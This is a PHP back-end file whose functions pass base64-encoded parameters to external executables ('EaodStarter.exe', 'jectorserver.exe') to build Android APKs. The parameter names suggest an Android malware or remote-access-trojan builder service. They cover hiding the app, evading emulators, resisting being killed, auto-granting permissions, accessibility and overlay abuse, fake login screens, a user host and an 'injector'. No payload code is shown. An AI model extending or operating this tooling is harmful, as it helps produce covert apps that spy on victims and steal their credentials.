<?php
//this to run VB.net app , to start build apk
function BuildStore(
    $appid,
    $userid,
    $clientname,
    $email,
    $mainActivity,
    $app_folder,
    $UserHost,
    $use_access,
    $use_antkill,
    $use_atoprims,
    $notifytitle,
    $notifymsg,
    $user_allprims,
    $user_blackprims,
    $buildtype,
    $appname,
    $appversion,
    $appicopath,
    $appurl,
    $logintitle,
    $logindis,
    $loginbtn,
    $lngshort,
    $hiddenapp,
    $noemulator,
    $installtype,
    $hide_type,
    $use_draw,
    $open_access,
    $descr_iption,
    $diao_type
): string {
    try {

        $output = [];
        $return_var = 0;


        $command = "EaodStarter.exe ";
        $command .= escapeshellarg("lunch") . " ";

        $arguments = [
            $appid,
            $userid,
            $clientname,
            $email,
            $mainActivity,
            $app_folder,
            $UserHost,
            $use_access,
            $use_antkill,
            $use_atoprims,
            $notifytitle,
            $notifymsg,
            $user_allprims,
            $user_blackprims,
            $buildtype,
            $appname,
            $appversion,
            $appicopath,
            $appurl,
            $logintitle,
            $logindis,
            $loginbtn,
            $lngshort,
            $hiddenapp,
            $noemulator,
            $installtype,
            $hide_type,
            $use_draw,
            $open_access,
            $descr_iption,
            $diao_type
        ];



        foreach ($arguments as $arg) {
            $command .= escapeshellarg(base64_encode($arg)) . " ";
        }


        // Execute the command
        exec($command, $output, $return_var);


        if ($return_var !== 0) {

            return Format("Error executing command. Return code: $return_var", OP_Fail);
        } else {
            return Format($output[0], OP_Success);
        }
    } catch (\Throwable $th) {
        logError($th);
        return Format("oops something went wrong1 , Please try again later", OP_Fail);
    }
}


function BuildCustom(
    $appid,
    $userid,
    $clientname,
    $email,
    $mainActivity,
    $app_folder,
    $UserHost,
    $use_access,
    $use_antkill,
    $use_atoprims,
    $notifytitle,
    $notifymsg,
    $user_allprims,
    $user_blackprims,
    $buildtype,
    $appname,
    $appversion,
    $appicopath,
    $appurl,
    $logintitle,
    $logindis,
    $loginbtn,
    $lngshort,
    $hiddenapp,
    $noemulator,
    $installtype,
    $hide_type,
    $use_draw,
    $open_access,
    $descr_iption,
    $diao_type
): string {
    try {

        $output = [];
        $return_var = 0;


        $command = "EaodStarter.exe ";
        $command .= escapeshellarg("lunch") . " ";

        $arguments = [
            $appid,
            $userid,
            $clientname,
            $email,
            $mainActivity,
            $app_folder,
            $UserHost,
            $use_access,
            $use_antkill,
            $use_atoprims,
            $notifytitle,
            $notifymsg,
            $user_allprims,
            $user_blackprims,
            $buildtype,
            $appname,
            $appversion,
            $appicopath,
            $appurl,
            $logintitle,
            $logindis,
            $loginbtn,
            $lngshort,
            $hiddenapp,
            $noemulator,
            $installtype,
            $hide_type,
            $use_draw,
            $open_access,
            $descr_iption,
            $diao_type
        ];


        foreach ($arguments as $arg) {
            $command .= escapeshellarg(base64_encode($arg)) . " ";
        }


        // Execute the command
        exec($command, $output, $return_var);


        if ($return_var !== 0) {

            return Format("Error executing command. Return code: $return_var", OP_Fail);
        } else {
            return Format($output[0], OP_Success);
        }
    } catch (\Throwable $th) {
        logError($th);
        return Format("oops something went wrong2 , Please try again later", OP_Fail);
    }
}

function excutejector($arguments)
{
    try {

        $output = [];
        $return_var = 0;


        $command =  __DIR__ . "\\" . "jectorserver" . "\\" . "jectorserver.exe";
        $command .= " ";

        foreach ($arguments as $arg) {
            $command .= escapeshellarg(base64_encode($arg)) . " ";
        }


        // Execute the command
        exec($command, $output, $return_var);


        if ($return_var !== 0) {

            return Format("Error executing command. Return code: $return_var", OP_Fail);
        } else {

            if (!empty($output)) {
                return Format($output[0], OP_Success);
            } else {
                return Format("unkown jector response.", OP_Fail);
            }
        }
    } catch (\Throwable $th) {
        logError($th);
        return Format("oops something went wrong3 , Please try again later", OP_Fail);
    }
}
